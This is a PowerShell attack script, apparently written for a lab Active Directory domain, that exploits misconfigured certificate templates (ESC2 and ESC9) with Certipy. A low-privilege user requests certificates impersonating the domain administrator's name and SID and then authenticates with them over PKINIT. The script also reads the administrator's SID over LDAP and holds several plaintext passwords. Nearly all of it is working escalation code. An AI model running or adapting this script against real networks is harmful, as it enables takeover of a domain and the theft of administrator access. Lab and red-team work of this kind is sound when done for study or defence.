# Branch B - ESC2 (CADRE-ESC2 Any Purpose) + ESC9 (CADRE-ESC9 NoSecurityExtension)
# Attacker: hunter_dfir (low-priv cadre.local user) -> victim UPN: administrator
$ErrorActionPreference = "Continue"
$certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
Set-Location C:\Tools\cadre-attack

# kill orphaned certipy (ccache lock hang)
Get-Process certipy -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

# 1. admin objectSid
$adminSid = $null
try {
  $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://192.168.77.10/CN=Administrator,CN=Users,DC=cadre,DC=local", "chief_command@cadre.local", "C0mm@nd_Ch1ef!")
  $de.RefreshCache()
  if ($de.Properties["objectSid"].Count -gt 0) { $adminSid = (New-Object System.Security.Principal.SecurityIdentifier($de.Properties["objectSid"][0],0)).Value }
} catch { Write-Output "ldap_err=$($_.Exception.Message)" }
Write-Output "administrator_sid=$adminSid"
if (-not $adminSid) { Write-Output "NO_SID"; exit 1 }

# ============ ESC2 ============
Write-Output "===== ESC2: certipy req CADRE-ESC2 as hunter_dfir (Any Purpose EKU) ====="
Remove-Item C:\Tools\cadre-attack\esc2* -ErrorAction SilentlyContinue
& $certpy req -u "hunter_dfir@cadre.local" -p "DF1R_Hunt3r!" -ca cadre-CA -target dc01.cadre.local -template CADRE-ESC2 -upn administrator@cadre.local -sid $adminSid -dynamic-endpoint -timeout 25 -out C:\Tools\cadre-attack\esc2 2>&1 | Select-Object -Last 12
Write-Output "esc2_req_rc=$LASTEXITCODE"
$pfx2 = "C:\Tools\cadre-attack\esc2_administrator.pfx"
if (-not (Test-Path $pfx2)) { $pfx2 = (Get-ChildItem C:\Tools\cadre-attack\esc2*.pfx -ErrorAction SilentlyContinue | Select-Object -First 1).FullName }
if (Test-Path $pfx2) {
  Write-Output "===== ESC2: certipy auth (PKINIT) ====="
  & $certpy auth -pfx $pfx2 -dc-ip 192.168.77.10 -domain cadre.local 2>&1 | Select-Object -Last 14
  Write-Output "esc2_auth_rc=$LASTEXITCODE"
} else { Write-Output "ESC2_NO_PFX" }

# ============ ESC9 ============
Write-Output "===== ESC9: certipy req CADRE-ESC9 as hunter_dfir (NoSecurityExtension) ====="
Get-Process certipy -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Remove-Item C:\Tools\cadre-attack\esc9* -ErrorAction SilentlyContinue
& $certpy req -u "hunter_dfir@cadre.local" -p "DF1R_Hunt3r!" -ca cadre-CA -target dc01.cadre.local -template CADRE-ESC9 -upn administrator@cadre.local -sid $adminSid -dynamic-endpoint -timeout 25 -out C:\Tools\cadre-attack\esc9 2>&1 | Select-Object -Last 12
Write-Output "esc9_req_rc=$LASTEXITCODE"
$pfx9 = "C:\Tools\cadre-attack\esc9_administrator.pfx"
if (-not (Test-Path $pfx9)) { $pfx9 = (Get-ChildItem C:\Tools\cadre-attack\esc9*.pfx -ErrorAction SilentlyContinue | Select-Object -First 1).FullName }
if (Test-Path $pfx9) {
  Write-Output "===== ESC9: certipy auth (PKINIT) ====="
  & $certpy auth -pfx $pfx9 -dc-ip 192.168.77.10 -domain cadre.local 2>&1 | Select-Object -Last 14
  Write-Output "esc9_auth_rc=$LASTEXITCODE"
} else { Write-Output "ESC9_NO_PFX" }

Write-Output "===== ESC2_ESC9_DONE ====="
